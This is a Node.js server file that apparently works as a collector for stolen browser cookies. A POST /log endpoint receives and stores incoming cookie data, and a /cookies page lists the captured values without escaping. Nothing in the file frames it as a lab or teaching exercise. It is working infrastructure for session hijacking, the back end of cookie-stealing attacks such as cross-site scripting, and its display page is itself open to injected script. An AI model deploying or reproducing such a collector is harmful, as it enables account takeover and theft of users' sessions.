const http = require('http');
const fs = require('fs');
const path = require('path');

let receivedCookies = [];

const server = http.createServer((req, res) => {
    // Handle POST request to /log to receive cookies
    if (req.method === 'POST' && req.url === '/log') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            // Store the cookies in memory
            receivedCookies.push(body);
            console.log('Cookies received and stored:', body);
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('Cookies received');
        });
    } else if (req.url === '/cookies') {
        // Serve the HTML file for displaying cookies
        fs.readFile(path.join(__dirname, 'cookies.html'), (err, content) => {
            if (err) {
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Server Error');
                return;
            }

            // Replace a placeholder in cookies.html with the actual cookies
            const html = content.toString().replace('{{COOKIES_PLACEHOLDER}}',
                receivedCookies.map(cookie => `<li>${cookie}</li>`).join('')
            );

            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(html);
        });
    } else {
        // Serve the HTML file for any other request
        fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
            if (err) {
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Server Error');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(content);
        });
    }
});

const PORT = 3000;
server.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
